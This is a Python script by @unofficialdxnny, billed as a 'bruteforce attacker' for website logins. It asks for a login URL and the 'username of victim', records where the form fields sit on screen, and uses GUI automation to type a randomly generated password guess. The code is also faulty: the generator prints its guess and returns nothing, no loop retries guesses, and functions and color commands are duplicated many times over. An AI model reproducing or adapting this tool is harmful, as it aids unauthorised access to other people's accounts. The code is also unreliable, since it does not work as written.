## Python bruteforce attacker
## By @unofficialdxnny



### Modules that will be used
import getpass
from datetime import date 
from colorama import Fore, Back, Style
import sys
from time import sleep
import keyboard
import pyautogui as pag
import os
import requests 
import webbrowser
import time
import string
import random


## when the program starts it clears the terminal
os.system('cls')



print("""

                  
                  

         
            /££££££                      /££           /££ /£££££££                        /££              
           /££__  ££                    |__/          | ££| ££__  ££                      | ££              
          | ££  \__/  /££££££   /£££££££ /££  /££££££ | ££| ££  \ ££  /££££££  /££   /££ /££££££    /££££££ 
          |  ££££££  /££__  ££ /££_____/| ££ |____  ££| ££| £££££££  /££__  ££| ££  | ££|_  ££_/   /££__  ££
           \____  ££| ££  \ ££| ££      | ££  /£££££££| ££| ££__  ££| ££  \__/| ££  | ££  | ££    | ££££££££
           /££  \ ££| ££  | ££| ££      | ££ /££__  ££| ££| ££  \ ££| ££      | ££  | ££  | ££ /££| ££_____/
          |  ££££££/|  ££££££/|  £££££££| ££|  £££££££| ££| £££££££/| ££      |  ££££££/  |  ££££/|  £££££££
           \______/  \______/  \_______/|__/ \_______/|__/|_______/ |__/       \______/    \___/   \_______/
                                                                                                  
                                                                   Author: unofficialdxnny
                                                                       Version: 1.0.0                               
                                                                                                  


""")

## background color is black(0) and the text is green(A)
os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 


## new linee
print("\n")

os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 





## Gets system time
today = date.today()

## date format
d2 = today.strftime("%B %d, %Y")


## typewriter effect
def type(text):
  words = text
  for char in words:
    sleep(0.1)
    sys.stdout.write(char)
    sys.stdout.flush()
type('Program launched successfully today @ ')



## print the final time
print(d2)

os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 

print("\n")
### Final code that does the bruteforcing
url = input("Enter Site login Url: ")

os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 

print("\n")

username = input("Enter the username of victim: ")


os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 



os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 

os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 
os.system('color 0b') 
os.system('color 0A') 


## typewriter effect
def type(text):
  words = text
  for char in words:
    sleep(0.1)
    sys.stdout.write(char)
    sys.stdout.flush()
type('I have just opened your webpage \n ')

webbrowser.open(url)


## typewriter effect
def type(text):
  words = text
  for char in words:
    sleep(0.1)
    sys.stdout.write(char)
    sys.stdout.flush()
type("Press Enter when your mouse is over the username/email area \n")




if keyboard.read_key() == "enter":
  usernamebar = pag.position()
  print(f"Cords captured: {usernamebar}")
  time.sleep(2)

  
  
  
## typewriter effect
def type(text):
  words = text
  for char in words:
    sleep(0.1)
    sys.stdout.write(char)
    sys.stdout.flush()
type("Press Enter when your mouse is over the password area \n")




if keyboard.read_key() == "enter":
  passwordbar = pag.position()
  print(f"Cords captured: {passwordbar}")
  time.sleep(5)

  


## os.system("taskkill /im chrome.exe /f")


## typewriter effect
def type(text):
  words = text
  for char in words:
    sleep(0.1)
    sys.stdout.write(char)
    sys.stdout.flush()
type("All set lets move to the final step")

print("\n")



 ## Gets system time
today = date.today()

## date format
d2d = today.strftime("%B %d, %Y")

## typewriter effect
def type(text):
  words = text
  for char in words:
    sleep(0.1)
    sys.stdout.write(char)
    sys.stdout.flush()
type('Successfully started today @ ')


## print the final time
print(d2d)

##open the url again

## webbrowser.open(url)

## chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"






def password_generator():
  import random
  uChar = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
  lChar = "abcdefghijklmnopqrstuvwxyz"
  num = "1234567890"

  char_list_upper = list(uChar)
  char_list_lower = list(lChar)
  char_list_num = list(num)

  upper = 'U' # uppercase 
  firstChar = random.choices(char_list_upper, k=len(upper))

  lower = 'lllll' # average len in name
  lastChar = random.choices(char_list_lower, k=len(lower))

  num = '1965' # date/year
  numbers = random.choices(char_list_num, k=len(num))

  guess = "".join(firstChar + lastChar + numbers)
  print(guess)

username = input('username : ')
password = password_generator()


        # move to username box
pag.moveTo(usernamebar[0], usernamebar[1], 0.5)
pag.click()
time.sleep(2)
keyboard.write(username)
time.sleep(2)

        # move to password box
pag.moveTo(passwordbar[0], passwordbar[1], 0.5)
pag.click()
time.sleep(2)
keyboard.write(password)
time.sleep(1)


